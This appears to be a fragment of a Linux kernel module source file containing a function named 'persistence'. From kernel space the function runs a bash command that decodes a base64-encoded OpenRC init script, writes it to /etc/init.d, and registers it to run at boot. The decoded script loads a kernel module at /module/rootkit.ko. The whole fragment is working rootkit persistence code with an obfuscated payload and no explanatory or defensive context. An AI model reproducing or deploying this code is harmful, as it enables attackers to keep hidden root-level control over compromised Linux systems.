#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/sched.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/kallsyms.h>
#include <linux/fs_struct.h>
#include <linux/slab.h>
#include <linux/kthread.h>


void persistence(void)
{
    char *cmd1_argv[] = { 
    "/bin/bash", 
    "-c", 
    "echo 'IyEvc2Jpbi9vcGVucmMtcnVuCiMgQ29weXJpZ2h0IChjKSAyMDA3LTIwMTUgVGhlIE9wZW5SQyBBdXRob3JzLgojIFNlZSB0aGUgQXV0aG9ycyBmaWxlIGF0IHRoZSB0b3AtbGV2ZWwgZGlyZWN0b3J5IG9mIHRoaXMgZGlzdHJpYnV0aW9uIGFuZAojIGh0dHBzOi8vZ2l0aHViLmNvbS9PcGVuUkMvb3BlbnJjL2Jsb2IvSEVBRC9BVVRIT1JTCiMKIyBUaGlzIGZpbGUgaXMgcGFydCBvZiBPcGVuUkMuIEl0IGlzIHN1YmplY3QgdG8gdGhlIGxpY2Vuc2UgdGVybXMgaW4KIyB0aGUgTElDRU5TRSBmaWxlIGZvdW5kIGluIHRoZSB0b3AtbGV2ZWwgZGlyZWN0b3J5IG9mIHRoaXMKIyBkaXN0cmlidXRpb24gYW5kIGF0IGh0dHBzOi8vZ2l0aHViLmNvbS9PcGVuUkMvb3BlbnJjL2Jsb2IvSEVBRC9MSUNFTlNFCiMgVGhpcyBmaWxlIG1heSBub3QgYmUgY29waWVkLCBtb2RpZmllZCwgcHJvcGFnYXRlZCwgb3IgZGlzdHJpYnV0ZWQKIyBleGNlcHQgYWNjb3JkaW5nIHRvIHRoZSB0ZXJtcyBjb250YWluZWQgaW4gdGhlIExJQ0VOU0UgZmlsZS4KCm5hbWU9Im1hbGljaW91cyIKY29tbWFuZD0iL3NiaW4vaW5zbW9kIgpjb21tYW5kX2FyZ3M9Ii9tb2R1bGUvcm9vdGtpdC5rbyIKCiNkZXBlbmQoKQojewojICAgICAgICBuZWVkIHJvb3QKI30KCnN0YXJ0KCkgCnsKICAgICAgICAkY29tbWFuZCAkY29tbWFuZF9hcmdzCn0KCg==' | base64 -d > /etc/init.d/malicious_file_service && /bin/chmod 755 /etc/init.d/malicious_file_service &&  /sbin/rc-update add /etc/init.d/malicious_file_service default",
    NULL 
};
    char *cmd1_envp[] = { 
    "HOME=/",
    "TERM=linux",
    "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
    NULL 
};
    call_usermodehelper(cmd1_argv[0], cmd1_argv, cmd1_envp, UMH_WAIT_EXEC);

}
